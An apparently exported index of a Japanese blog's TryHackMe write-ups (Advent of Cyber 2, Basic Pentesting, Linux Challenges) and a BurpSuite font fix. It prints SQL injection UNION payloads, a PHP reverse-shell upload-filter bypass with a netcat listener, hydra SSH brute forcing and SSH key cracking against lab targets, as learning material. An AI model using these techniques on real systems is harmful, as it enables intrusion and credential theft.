[{"content":"はじめに 今回はOWASP ZAPを使ってXSSを発見する章になります。\n基本的には本文中に解説が乗っており、OWASP ZAPを使ったことがない人を対象としている感じがしました。\n本記事は全てのセキュリティに携わる人に向けて執筆しており、クラッキングを推奨するものではありません。本記事の手法を用いて、許可された環境以外で実行することは絶対にやめてください。  Be careful with what you wish on a Christmas night What vulnerability type was used to exploit the application?  アプリケーションを悪用するために使用された脆弱性の種類は何ですか？\n こちらは前の文章を読んでいれば解ける問題です。\nWhat query string can be abused to craft a reflected XSS?  どのようなクエリー文字列を悪用して、反射型XSSを作成することができますか？\n 反射型XSSの基本的な部分です\nRun a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan?  ターゲットに対してZAP（zaproxy）自動スキャンを実行します。スキャンに含まれるXSSアラートは何件ですか？\n こちらも説明文を読めば解ける問題でした。\nおわりに 今回は本文を読めばすぐに終わってしまうラッキー問題でした。\nWebアプリケーションの脆弱性診断やBugBountyではプロキシツールを多用するため、使ったことのない人はツールの使い方を学べるいい機会だと感じました。\n","description":"","id":0,"section":"posts","tags":["TryHackMe","WriteUP","XSS","OWASP ZAP"],"title":"【THM: TryHackMe】Advent of Cyber 2を解いてみた【Day6】","uri":"https://blog.yuk1h1ra.me/posts/2021/12/advent-of-cyber-2-day6/"},{"content":"はじめに 今回はSQLインジェクションを使った章になります。\nUNIONを使ってデータベースの中身を見ていく基本的な内容ですが、日頃から取り組んでいないとついつい忘れてしまいがちな項目になると思います。\nSQLインジェクションという基本的な脆弱性の問題のため、いい復習の機会になると思います。\n本記事は全てのセキュリティに携わる人に向けて執筆しており、クラッキングを推奨するものではありません。本記事の手法を用いて、許可された環境以外で実行することは絶対にやめてください。  Someone stole Santa\u0026rsquo;s gift list! Without using directory brute forcing, what\u0026rsquo;s Santa\u0026rsquo;s secret login panel?  ディレクトリのブルートフォースを使わずに、サンタの秘密のログインパネルを教えてください。\n ブルートフォースを使わずにということで、ログイン画面に遷移しそうなURLを推測する問題です。\nWebページから使用されそうな単語をとりあえず突っ込んでみたりするのがいいですが、今回のSQLインジェクションにはあまり問題ではないため、ある程度試してみたらヒントをみて回答しました。\nVisit Santa\u0026rsquo;s secret login panel and bypass the login using SQLi  サンタの秘密のログインパネルにアクセスし、SQLiを使ってログインをバイパスする\n 先程の隠されたログインパネルにアクセスすると、UsernameとPasswordを入力するログイン画面が表示されました。\nここで、適当にSQLインジェクションをしてみます。\n無事ログインできました。\nHow many entries are there in the gift database?  giftデータベースにはいくつのエントリがありますか？\n 検索ボックスにaや1などの適当なものを入れてみると、検索ボックスに含まれた文字列をLIKE演算子を持ちいて探してくることが推測されます。\n使われているデータベースを調べていくと、SQLiteが使われていることが分かったので、必要な情報を列挙していきます。\nまずは、テーブルの名前を取得します。\n1  asdfasdf\u0026#39; UNION SELECT 1, tbl_name FROM sqlite_master --   実行すると以下の結果になります。\nsequelsテーブルに対して、カウントで数を数えあげれば終了です。\n1  asdf\u0026#39; UNION SELECT 1, COUNT(*) FROM sequels--   What did Paul ask for?  パウロは何を求めましたか？\n 先程のsequelsのカラムを確認していきます。\nPayloadsはPayloadsAllTheThingsを参考にしています。\n1  asdfasdf\u0026#39; UNION SELECT 1, sql FROM sqlite_master WHERE type != \u0026#39;meta\u0026#39; AND sql NOT NULL AND name = \u0026#39;sequels\u0026#39;--   実行すると以下の結果になります。\n以上の結果から、sequelsのカラムには、title, kid, ageの3つがあることがわかりました。\nよって、Paulが求めているGiftは以下のように求めます。\n1  asdf\u0026#39; UNION SELECT title, kid FROM sequels WHERE kid=\u0026#39;Paul\u0026#39;--   What is the flag?  flagは何ですか？\n 先程と同様のことをやるだけです。\nWhat is admin\u0026rsquo;s password?  adminのパスワードは何ですか？\n こちらも同様にカラムの列挙をし、表示させて終了です。\nおわりに 今回はSQLインジェクションを用いてデータベースの内容を読み取るという問題でした。\nWriteUPを書きながら解いていった結果、2時間ほどで全ての問題に回答することができました。\n問題文にもあったように、sqlmapを用いるとより簡単にできるのですが、今回のWriteUPでは実際に愚直に解いていきました。\n一通りとき終わったあとに、sqlmapを使って解いてみるというのが1番勉強になるかと思います。\n","description":"","id":1,"section":"posts","tags":["TryHackMe","WriteUP","SQLInjection","sqlmap"],"title":"【THM: TryHackMe】Advent of Cyber 2を解いてみた【Day5】","uri":"https://blog.yuk1h1ra.me/posts/2021/11/advent-of-cyber-2-day5/"},{"content":"はじめに 今回はwordlistを使って、ファジング/ブルートフォースをする章になります。\nファジングやブルートフォースによく使われるツールの使い方の説明、実際にそれを使ってみるいい機会になります。\nそれでは解いていきましょう\n本記事は全てのセキュリティに携わる人に向けて執筆しており、クラッキングを推奨するものではありません。本記事の手法を用いて、許可された環境以外で実行することは絶対にやめてください。  Santa\u0026rsquo;s watching Given the URL \u0026ldquo;http://shibes.xyz/api.php\u0026quot;, what would the entire wfuzz command look like to query the \u0026ldquo;breed\u0026rdquo; parameter using the wordlist \u0026ldquo;big.txt\u0026rdquo; (assume that \u0026ldquo;big.txt\u0026rdquo; is in your current directory)  URL「http://shibes.xyz/api.php」が与えられた時、ワードリスト「big.txt」を使用して「breed」パラメータをクエリすると、wfuzzコマンドはどのようになりますか。（「big.txt\u0026gt;」が現在のディレクトリ配下を推定）\n これは「http://shibes.xyz/api.php」に対して、「breed」パラメータに「big.txt」を使用したwfuzz\u0026raquo;コマンドを問われています。\nwfuzzコマンドの使い方を理解していますか？という問題ですね。\nこの問題が分からない場合は問題文をよく読み、wfuzzのヘルプを参照したりすると良いと思います。\n実際に「http://shibes.xyz/api.php」に対して、\nこのコマンドを実行しないでください Use GoBuster (against the target you deployed \u0026ndash; not the shibes.xyz domain) to find the API directory. What file is there?  デプロイしたターゲットに対して、GoBusterを使用してAPIディレクトリを見つけます。どのファイルがありますか？\n 今回もディレクトリサーチの時間です。\ngobusterコマンドを使用して、(隠された)APIディレクトリを探していきます。\nbig.txtに含まれるワードリストは膨大なため、-tオプションを使って高速に処理を進めています。\n1  gobuster dir -u http://10.10.XXX.XXX/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100   無事ディレクトリを発見することが出来ました。\nAPIディレクトリのファイル名が答えになります。\nFuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?  APIディレクトリで見つけたファイルに「date」パラメータでファジングします。正しい投稿に表示されるフラグは何ですか？\n 前２問の解答を応用して答える問題のようです。\nwfuzzの使い方、隠されたファイルの列挙が出来ていれば答えられます。\nここでファジングに使うwordlistも提供されているので、予めダウンロードしておきます。\n1  wfuzz -c -z file,wordlist http://10.10.XXX.XXX/api/site-log.php?date=FUZZ   実行すると、一つだけAPIから値が帰ってきているパラメータを発見できます。\nブラウザでそのパラメータで確認するとFlagがゲット出来ます。\nおわりに 今回はディレクトリサーチをするgobuster、ファジングツールであるwfuzzを使ってフラグの奪取をする方法を学びました。\n基本的な使い方がわかっていれば30分程度で終わる内容となっていました。\nTryHackMeの本文では、ブルートフォースとファジングは違うと記載されていましたが、自分にはその違いがあまりよく分かっていません。\n調べたところ、以下のRedditがありましたが、今回に関してはファジングというのかブルートフォースというのかという問題が残っています。\n   どなたか違いが分かる方がいらっしゃいましたら、教えていただけると幸いです。\n","description":"","id":2,"section":"posts","tags":["TryHackMe","WriteUP","Web Exploitation","gobuster","wfuzz"],"title":"【THM: TryHackMe】Advent of Cyber 2を解いてみた【Day4】","uri":"https://blog.yuk1h1ra.me/posts/2021/08/advent-of-cyber-2-day4/"},{"content":"はじめに Day3では、認証について、デフォルト設定の危険性についてが主な題材となっています。\n認証とは、一般的にユーザーIDやパスワード等を用いて、実際に本人であるかを確認する手法です。\n攻撃者はこの認証をどうにかして突破したいと考えており、今回は認証情報によく使われるリストを用いて突破する方法を紹介しています。\nそれでは、Day3を解いていきましょう。\n本記事は全てのセキュリティに携わる人に向けて執筆しており、クラッキングを推奨するものではありません。本記事の手法を用いて、許可された環境以外で実行することは絶対にやめてください。  Christmas Chaos 最初にTopページにアクセスすると、次のような画面が表示されます。\n今回は、プロキシツールであるBurp Suiteを使って、辞書攻撃を仕掛ける問題となっています。\nKali LinuxやParrot Security OSを使用している場合はデフォルトでインストールされているため、そのまま立ち上げます。\nBurp Suiteはデフォルトで127.0.0.1:8080になっています。\nそれでは、FoxyProxyの設定をしていきます。\nFirefoxのアドオンのFoxyProxyをインストールした後に、以下の画像のOptionから設定していきます。\nOptionを押した後は以下の画像のようになるので、左上のAddから新しい設定を追加します。\nNameを好きな名前、IPアドレス/PortをBurpSuiteの設定に記載されているものに設定し、Saveで保存します。\n無事、新しい設定が表示されていることがわかります。\nでは、FoxyProxyで設定したものを選択し、http://burpsuiteにアクセスします。\n右上のCA Certificateをクリックし、証明書をダウンロードします。\nダウンロードした証明書をブラウザにインポートしていきます。\nFirefoxの設定から、プライバシーと設定-\u0026gt;証明書-\u0026gt;証明書を表示と進んでいき、先程ダウンロードした証明書をインポートしていきます。\nこれで、設定は完了です。\n正しく設定できていれば、BurpSuiteで確認することができます。\nしかし、このままでは意図していないリクエストも表示されてしまうため、フィルタリングをすることで見やすくしていきます。\nBurpSuiteのTarget-\u0026gt;Site mapから、今回のホストを右クリックし、Add to scopeを選択してあげます。\nその後、Proxy-\u0026gt;Http historyから、Filter: Hiding CSS, image and general binary contentをクリックし、Show only in-scope itemsにチェックをいれることで、ターゲットのリクエストのみを抽出することができます。\nあとは、TryHackMeに記載されている通りにやればフラグはゲットできます。\nおわりに 今回はほとんどCTFの解説をすることがなかったので、BurpSuiteの設定方法を詳しく説明しました。\n自分も最初はBurpSuiteの設定方法がうまく出来ず、苦労した経験があったので詰まりそうな部分を詳しく記載いたしました。\nCTFを始めてみたけど、設定から躓いてしまう人がいましたら、是非この記事を参考にしてみてください。\n","description":"","id":3,"section":"posts","tags":["TryHackMe","WriteUP","Web Exploitation","Burp Suite"],"title":"【THM: TryHackMe】Advent of Cyber 2を解いてみた【Day3】","uri":"https://blog.yuk1h1ra.me/posts/2021/08/advent-of-cyber-2-day3/"},{"content":"はじめに Advent of Cyber 2の2日目です。\n今回も基本的なWeb問題なため、CTF初心者の方でもとっつきやすいと思います。\nCTFが全くわからない方にも分かるように詳しく書いているので、是非自分で解いてみる事をオススメします。\nそれでは、解いていきましょう。\n本記事は全てのセキュリティに携わる人に向けて執筆しており、クラッキングを推奨するものではありません。本記事の手法を用いて、許可された環境以外で実行することは絶対にやめてください。  The Elf Strikes Back! 最初にアクセスすると以下のようなページが表示されます。\nでは問題を解いていきましょう。\nWhat string of text needs adding to the URL to get access to the upload page?  アップロードページにアクセスするには、URLにどの文字列を追加する必要がありますか？\n トップページには、Please enter your ID as a GET parameter (?id=YOUR_ID_HERE)とあるので、URLにIDを追加してみると無事アップロードページにアクセスすることができました。\nWhat type of file is accepted by the site?  サイトではどのような種類のファイルが受け入れられますか？\n ページにはIf you see any suspicious people near the factory, take a picture and upload it here!とあるので、画像イメージをアップロードすることができます。\nBypass the filter and upload a reverse shell.  フィルタをバイパスし、リバースシェルをアップロードします。\n 今回のサイトでは、png形式やjpg形式のみアップロードを受け入れているため、それを回避する方法を考えます。\n今回はファイル名を少し修正して、意図した形式以外のファイルのアップロードを試みます。\n1 2  cp /usr/share/webshells/php/php-reverse-shell.php ~/CTF/TryHackMe/Advent_of_Cyber_2/Day2/ mv php-reverse-shell.php php-reverse-shell.png.php   そして、php-reverse-shell.png.phpのコード上にあるIPアドレス/Port番号を書き換え、ファイルのアップロードをして準備完了です。\nファイルのアップロードに関するCTFのテクニックについては、以下のRoomが参考になります。\n   In which directory are the uploaded files stored?  アップロードされたファイルはどのディレクトリに保存されますか？\n ディレクトリサーチの時間です。隠されたディレクトリを探す時にブルートフォースアタックをして探していきます。\n今回はgobusterというツールを使って隠されたディレクトリを探しました。\n1  gobuster dir -u http://10.10.XXX.XXX -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --wildcard   正しいディレクトリを探し当てた時に、無事にphp-reverse-shell.png.phpがアップロードされていることが確認できます。\nActivate your reverse shell and catch it in a netcat listener!  リバースシェルをアクティブにして、netcatリスナーでキャッチしてください！\n 自分で設定したポート番号を使って、ncコマンドで待機しておきます。\n1  nc -lvnp XXXX   その後、ブラウザでアップロードしたファイルをクリックし、Terminal上でshellを奪取できたことを確認します。\nWhat is the flag in /var/www/flag.txt?  /var/www/flag.txtのフラグは何ですか？\n catコマンド等で確認して終了です。\nおわりに 今回はファイルのアップロードがあるサイトから、フィルタリングの脆弱性をついてシェルを奪取するCTFでした。\nWebアプリケーション開発者はファイルの拡張子の適切なフィルタリング設定をすることが大切です。\n","description":"","id":4,"section":"posts","tags":["TryHackMe","WriteUP","Web Exploitation"],"title":"【THM: TryHackMe】Advent of Cyber 2を解いてみた【Day2】","uri":"https://blog.yuk1h1ra.me/posts/2021/08/advent-of-cyber-2-day2/"},{"content":"はじめに 今回からTryHackMeで公開されているAdvent of Cyber 2を解いていきたいと思います。\nこのRoomではアドベントカレンダーのように12月１日から毎日問題が追加されていくタイプのRoomで、クリスマスまでの全24題出題されます。\n問題はBeginnersレベルを対象にしているので、興味がある方は一度解いてみることをオススメします。\n本記事は全てのセキュリティに携わる人に向けて執筆しており、クラッキングを推奨するものではありません。本記事の手法を用いて、許可された環境以外で実行することは絶対にやめてください。  [Day1] A Christmas Crisis この章では、Webとは何か、HTTP(S)とは何か、Cookieとは何かなど、Webを扱うにあたっての基本的なことを問われています。\n特に、認証、セッション管理について重きが置かれています。しかし、聞かれていることは基本的なことなので、Webアプリケーション開発者やCTFに触れたことがない人でも解けるような問題となっています。\nまず、ページにアクセスするとこのようなログイン画面が表示されます。\n適当なアカウントを作成し、ログインをすると次のような画面になります。\nページの構成はこの２つでしたので、それでは問題を解いていきましょう。\nWhat is the name of the cookie used for authentication?  認証に使用されるCookieの名前は何ですか？\n Cookieについて問われています。F12を押してDeveloper Toolsを開き、Cookieを確認しましょう。\nCookieの名前を確認して終了です。\nIn what format is the value of this cookie encoded?  このCookieの値はどの形式でエンコードされていますか？\n Cookieの値を見ると長い文字列で形成されていることがわかります。エンコード形式を特定できるような特徴的な部分がないか確認したりします。\n今回は、CyberChefというサイトを使って、エンコード形式を特定しました。\nHaving decoded the cookie, what format is the data stored in?  Cookieをデコードした後、データはどのような形式で保存されますか？\n 先程のCyberChefのOutputから、形式を特定しました。\nWhat is the value of Santa\u0026rsquo;s cookie?  *SantaのCookieの値は何ですか？\n CookieはJSON形式で保存されており、それがhexでエンコードされていました。今度はその逆を行います。\nInputに先程と同じような形式で、usernameをsantaに変更します。その後Hexに変換することで、santaのCookieを取得することができます。\nWhat is the flag you\u0026rsquo;re given when the line is fully active?  ラインが完全にアクティブなときに与えられるフラグは何ですか？\n 先程作成したsantaのcookieを、ブラウザのDeveloper Toolsを用いて置き換え、再度ページをリロードすることで、santaとしてログインすることができました。\n最初に作成したユーザーでは見られなかったコントロールパネルが表示され、これらを全てオンにすることで最後のフラグをゲットできます。\nおわりに 今回は脆弱なCookieの設定を用いて、他人になりすまし不正ログインする手法でした。\n問題としては1時間あれば終わるような問題でしたが、Webアプリケーションを開発していく上で、適切なセッション管理が必要であることを再認識するいい機会になりました。\n","description":"","id":5,"section":"posts","tags":["TryHackMe","Writeup","Web Exploitation"],"title":"【THM: TryHackMe】Advent of Cyber 2を解いてみた【Day1】","uri":"https://blog.yuk1h1ra.me/posts/2021/08/advent-of-cyber-2-day1/"},{"content":"普段プロキシツールであるBurpSuiteを使用していますが、そのフォントがあまりにも汚くとてもじゃないが読めたものじゃない状況でした。\n今回は、そんなBurpやZAPなど、Java applicationに関するフォントのアンチエイリアスについての解決方法を紹介します。\n環境 私の現在の環境は以下の通りです。\n OS: Manjaro Linux\nBurpSuite: v2021.3.3\nJava: OpenJDK Runtime Environment (build 15.0.2+7)\n 問題点 BurpSuiteを立ち上げた際に、フォントが以下のように綺麗に表示されておりませんでした。\n特に、タブの部分や、\n文字の部分が汚くなっていることが解ると思います。\n解決方法 天下のArchWikiに解決方法が乗っていました。\n   フォントのアンチエイリアスについては、/etc/environmentに追記するだけで済みそうです。\n1  sudo vim /etc/environment   # # This file is parsed by pam_env module # # Syntax: simple \u0026quot;KEY=VAL\u0026quot; pairs on separate lines # _JAVA_OPTIONS='-Dawt.useSystemAAFontSettings=on' この記述をした後、再起動すれば設定が反映されています。\nYouTubeにも同様にして解決している動画があったので添付しておきます。\n  設定反映後 設定反映後の状態を見てみましょう\n先程よりも綺麗に表示されていることが分かりますでしょうか？\n気になっていたタブやフォントの拡大画像はこちらです。\n無事に綺麗なフォントで表示することができました。\nおわりに 普段使っているツールなだけに、アンチエイリアスのかかっていないフォントではやる気が削がれたり、見にくく目が疲れてしまったりします。\nこういった少しの手間だけでこんなにも綺麗になり、変なところでストレスを抱えず生産性の向上につながっていくと思います。\n最後まで読んでいただきありがとうございます。この記事が誰かの役になったのなら幸いです。\n","description":"LinuxでBurpSuiteを使っているとフォントがガビガビで表示されてしまっているため、綺麗なフォントに変更する方法を紹介します。","id":6,"section":"posts","tags":["burpsuite"],"title":"BurpSuiteのガビガビなフォントを綺麗にする方法","uri":"https://blog.yuk1h1ra.me/posts/2021/05/how-to-beautify-fonts-in-burpsuite/"},{"content":"はじめに 今回はTryHackMeのBasic Pentestingを解いてみたので、そのWriteUPを書いていきたいと思います。\n自分は約２時間程度で全ての問題を解き終わることが出来ましたので、時間の参考にしてみてください。\nWriteUP Find the services exposed by the machine 攻略するマシンのサービスの列挙です。\nnmapを使ってポートスキャンをしていきます。\n1  nmap -v -p-10000 10.10.xxx.xxx   これでポートの列挙が出来ました。\n What is the name of the hidden directory on the web server(enter name without /)? hidden derectoryを探す問題です。\ngobusterを実行してあげます。\n1  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.xxx.xxx   無事hidden directoryを見つけることが出来ました。\n User brute-forcing to find the username \u0026amp; password まずは、ポートスキャンで得た情報から、SMBが動いていることがわかります。\nそのため、smbからUsernameを獲得しようと考え、今回はenum4linuxを使用しました。\n   1  enum4linux -a 10.10.xxx.xxx   What is the username? enum4linuxからの情報で、２つのユーザーを見つけることが出来ました。\n What is the password? nmapにてSSHのポートが開いていることが確認できたので、hydraを使ってパスワードのブルートフォースを試していきます。\n1  hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.xxx.xxx ssh   Enumerate the machine to find any vectors for privilege escalation まずは先程獲得した他のユーザのディレクトリを確認し、特権昇格できそうな情報を探していきます。\n 最終的にpass.bakの中身を確認できればこのRoomは完了しそうだなぁというのを頭にいれつつ、.sshディレクトリの中身を見ていきます。\n id_rsaが読み取り可能になっているので、そこから特権昇格を狙っていこうと思います。\nIf you have found another user, what can you do with this information? 獲得したid_rsaでssh接続を試みてみます。\n しかし、パスフレーズを求められてしまいました。\nここで、SSH2Johnを使って、SSH Key Passwordの解析を試みます。\n1  python2 /usr/share/john/ssh2john.py id_rsa \u0026gt; id_rsa_hash.txt   1  john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH id_rsa_hash.txt   無事パスワードがわかったので、ログインしていきます。\n1  ssh -i id_rsa kay@10.10.201.184   What is the final password you obtain? ログインが出来たので、最終的なフラグをゲットして終わりです。\n1  cat pass.bak   まとめ 今回はTryHackMeのBasic Pentestingを解いてみました。\nこれを解く前にLeaning PathのCOMPLETE BEGINNERを全て解いていたので、詰まりそうになったときはヒントを見たり、前の章をさらっと復習をすることをオススメします。\n","description":"","id":7,"section":"posts","tags":["ctf","tryhackme","basic-pentesting","writeup"],"title":"【THM: TryHackMe】Basic Pentestingを解いてみた【WriteUP】","uri":"https://blog.yuk1h1ra.me/posts/2021/03/thm-basic-pentesting-writeup/"},{"content":"はじめに Part1や、Part2に続いて第３回になりました。\n今回でTryHackMeのLinux ChallengesのWriteUPは終了となります。\nそれでは解いていきましょう。\nWriteUP Task 5 SQL, FTP, Groups and RDP Use curl to find flag 30 curlを使ってflag30を奪取しましょうとあったので、sshで接続していない端末にて、curlコマンドを実行して終了です。\n1 2  $ curl 10.10.230.39 flag30:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   Flag 31 is a MySQL database name MySQLの問題ですね。\nとりあえずログインし、データベース一覧を確認したらありました。\n1 2 3 4 5 6 7 8 9 10 11 12 13  $ mysql -uroot -pxxxxxx mysql\u0026gt; show databases; +-------------------------------------------+ | Database | +-------------------------------------------+ | information_schema | | database_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | | mysql | | performance_schema | | sys | +-------------------------------------------+ 5 rows in set (0.01 sec)   Bonus flag question, get data out of the table from the database you found above こちらもフラグのあったデータベースから、データを取得して終了です。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  mysql\u0026gt; show tables; +-----------------------------------------------------+ | Tables_in_database_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | +-----------------------------------------------------+ | flags | +-----------------------------------------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from flags; +----+----------------------------------+ | id | flag | +----+----------------------------------+ | 1 | xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | +----+----------------------------------+ 1 row in set (0.00 sec)   Using SCP, FileZilla or another FTP client download flag32.mp3 to reveal flag 32 SCPまたは、FileZillaなどを用いてflag32.mp3をダウンロードしろとのこと。\nflag32.mp3は/home/alice/配下にあったため、そちらをscpを用いて取得しました。\n1  $scp -r alice@10.10.230.39:/home/alice/flag32.mp3 ./flag32.mp3   mp3ファイルでしたので、VLCで開いたところフラグの音声が聞こえてきます。\nが、自分はVMのオーディオ設定をしていなかったため、そこは注意が必要です。\nFlag 33 is located where your personal $PATH\u0026rsquo;s are stored Linuxの基本的な内容を説いている問題です。\n個人のPATHをどこに記述するかの話ですね。\nzshなんかだと、.zprofileとかにもなりますが、今回は.profileを確認いたしました。\n1 2 3 4 5 6 7 8  $ find /home -type f -name .profile 2\u0026gt;/dev/null /home/bob/.profile /home/ubuntu/.profile /home/garry/.profile /home/alice/.profile cat /home/bob/.profile #Flag 33: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   Switch your account back to bob. Using system variables, what is flag34? 環境変数を問う問題ですね。アカウントをbobに変更後、echoコマンドでflag34を確認しました。\nflag34が記述されている場所は/etc/environmentに記述されていました。\n1 2 3 4 5  $ su bob Password: $ echo $flag34 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   Look at all groups created on the system. What is flag 35? ユーザの場合は/etc/passwdなんかで確認できるのですが、今回はgroupsということで、/etc/groupを確認しました。\n1 2 3 4 5 6  $ cat /etc/group (中略) flag35_xxxxxxx: x :1005: (中略)   Find the user which is apart of the \u0026ldquo;hacker\u0026rdquo; group and read flag 36 先程、/etc/groupで確認したところ、hackerグループに属しているのはbobでした。\nなので、aliceのまま確認しようとしても見れないかと思います。\nflag自体は、findのオプションにて、hackerグループに属しているものを探しました。\n1 2 3 4  bob@ip-10-10-230-39:~$ find / -group hacker 2\u0026gt;/dev/null /etc/flag36 bob@ip-10-10-230-39:~$ cat /etc/flag36 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   おわりに これで、TryHackMeのLinux Challengesのすべての問題のWriteUPが終了しました。\n基本的なLinuxコマンドを知っている人や、学んだ人ならGoogleを駆使しながら解ける問題ばかりですが、これでCTFとはどんなものかを慣れていけると思います。\n","description":"","id":8,"section":"posts","tags":["writeup","ctf","tryhackme"],"title":"【THM: Try Hack Me】Linux Challengesを解いてみた - Part3【WriteUP】","uri":"https://blog.yuk1h1ra.me/posts/2020/12/thm-linux-challenges-writeup-part3/"},{"content":"はじめに 前回に引き続き、TryHackMeのLinux ChallengesのWriteUPです。\n今回は、Task4までの解法になります。\nWriteUP Task 4 Data Representation, Strings and Permissions Find and retrieve flag 20 まずは、flag20を確認します。\n1 2 3 4 5 6 7 8  alice@ip-10-10-239-217:~$ ls flag17 flag19 flag20 flag22 flag23 flag32.mp3 alice@ip-10-10-239-217:~$ file flag20 flag20: ASCII text alice@ip-10-10-239-217:~$ cat flag20 MDJiOWFhYjhhMjk5NzBkYjA4ZWM3N2FlNDI1ZjZlNjg=   中身を見るとflagが暗号化されていました。最後の「=」をみて、base64だろうなということで、pythonで適当にデコードして終わりです。\n1 2 3 4 5 6 7 8  alice@ip-10-10-239-217:~$ python3 Python 3.5.2 (default, Nov 12 2018, 13:43:14) [GCC 5.4.0 20160609] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import base64 \u0026gt;\u0026gt;\u0026gt; print(base64.b64decode(b\u0026#39;MDJiOWFhYjhhMjk5NzBkYjA4ZWM3N2FlNDI1ZjZlNjg=\u0026#39;).decode()) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx \u0026gt;\u0026gt;\u0026gt;   Inspect the flag21.php file. Find the flag flag21では、普通にcatをするだけでは見つけられないようになっていました。\n自分はvimで開いてしまいましたが、cat -Aを使う方法もあるそうです。\n1 2 3  alice@ip-10-10-239-217:~$ find / 2\u0026gt;/dev/null | grep flag21.php /home/bob/flag21.php alice@ip-10-10-239-217:~$ vim ../bob/flag21.php   Locate and read flag 22. Its represented as hex ファイルを確認すると16進で書かれたflagが出てきました。これらをASCIIに変換する必要があります。\n(なんとなく、41を見たらA, 61をみたらaだなという感覚を持っておくといいかもしれないです)\n1 2  alice@ip-10-10-239-217:~$ xxd -r -p flag22 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxalice@ip-10-10-239-217:~$   Locate, read and reverse flag 23 とても便利なrevコマンドというのを調べていて見つけたので、それでflagをゲットしました。\n1 2  alice@ip-10-10-239-217:~$ cat flag23 | rev xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   Analyse the flag 24 compiled C program. Find a command that might reveal human readable strings when looking in the machine code code flag24はC言語で書かれコンパイルされた物だそうです。\nとりあえずfileでファイルの確認をしていきます。\n1 2  alice@ip-10-10-239-217:/home/garry$ file flag24 flag24: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d88e59a01b68aa0969e59bb68726cd7bf8ded9bf, not stripped   実行ファイルだったので、これもまた実行してみます。\n1 2  alice@ip-10-10-239-217:/home/garry$ ./flag24 Nothing to see here!!alice@ip-10-10-239-217:/home/garry$   「ここにはないよ！」と怒られてしまいました。\nCTFで表層解析をする際にとりあえず打っとけ！ということで、stringsで一発でした。\n1  alice@ip-10-10-239-217:/home/garry$ strings flag24   Find flag 26 by searching the all files for a string that begins with 4bceb and is 32 characters long 自分は最初以下のコマンドで実行していたのですが、時間がかかりすぎていたり、うまくフラグが取れなかったのでカンニングしちゃいました。\n1  find / -type f 2\u0026gt;/dev/null | xargs grep -E \u0026#39;^4bceb\u0026#39; 2\u0026gt;/dev/null   考え方はあっていたのですが、細かいオプションとかですかね。。。？\nそのコマンドを使ったことはあるけど、その場しのぎで使っていたのがダメでしたね。少しずつ覚えていけたらなと思います。\n1 2 3 4 5 6 7 8 9  alice@ip-10-10-179-249:~$ find / -xdev -print0 -type f 2\u0026gt;/dev/null | xargs -0 grep -E \u0026#39;^[a-z0-9]{32}$\u0026#39; 2\u0026gt;/dev/null Binary file /snap/bin/amazon-ssm-agent.ssm-cli matches Binary file /var/cache/apt/pkgcache.bin matches Binary file /var/cache/apt/srcpkgcache.bin matches /var/cache/apache2/mod_cache_disk/config.json:4bceb76f490b24ed577d704c24d6955d /var/lib/dbus/machine-id:41da6f3264844132ae79a13a0e1457c3 /var/log/flagtourteen.txt:71c3a8ad9752666275dadf62a93ef393 /lib/terminfo/E/flag5.txt:bd8f33216075e5ba07c9ed41261d1703 /home/bob/.bash_history:9daf3281745c2d75fc6e992ccfdedfcd   Locate and retrieve flag 27, which is owned by the root user flag27はパーミッション関係でした。管理者権限で一発で終わりですね。\n1 2  alice@ip-10-10-179-249:~$ sudo cat /home/flag27 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx   Whats the linux kernel version? カーネルのバージョンの確認方法ですが、自分はオプションで--kernel-releaseを使っちゃいました。\nuname -aとかでも行けると思います。\n1 2  alice@ip-10-10-179-249:~$ uname --kernel-release 4.4.xxxxxxxxxx   Find the file called flag 29 and do the following operations on it   Remove all spaces in file. Remove all new line spaces. Split by comma and get the last element in the split.   これは最初カンマの直前の文字を列挙していくものだと思っていたので、だいぶ変なことをやっていました。\n調べていくなかで、trコマンドというのを見つけたので、それも使ってflagをゲットしています。\nやっていることは、1,2,3の順番通りにしているので理解はしやすいかと思います。\n1 2 3 4 5  alice@ip-10-10-97-2:/home/garry$ cat flag29 | tr -d \u0026#39; \u0026#39; | tr -d \u0026#39;\\n\u0026#39; | sed \u0026#39;s/,/,\\n/g\u0026#39; (中略) meinecaseferrivulputate, atmelpericulisocurreret.Dicoverearaccusamusuex, xxxxxxxxxxxxxxxxxxxxx.alice@ip-10-10-97-2:/home/garry$   終わりに 今回はTryHackMeのLinux ChallengesのTask4のWriteUPを書きました。\n使ったことはあるけど、詳しくは知らない、なんとなく名前だけ知っているコマンドなどもあり、こうやって使うのか〜と勉強になりながら解いていくことができました。\n次回のTask5にて、Linux ChallengesのWriteUPは終わりになります。\n","description":"","id":9,"section":"posts","tags":["writeup","ctf","tryhackme"],"title":"【THM: Try Hack Me】Linux Challengesを解いてみた - Part2【WriteUP】","uri":"https://blog.yuk1h1ra.me/posts/2020/11/thm-linux-challenges-writeup-part2/"},{"content":"Try Hack Meというオンラインでサイバーセキュリティを学べるサイトで学習を勧めています。\nそこでは、Walkthrough形式とCTFs形式で学ぶことができ、InputとOutputを両方学習することができます。\n今回はそのTryHackMeのLinux 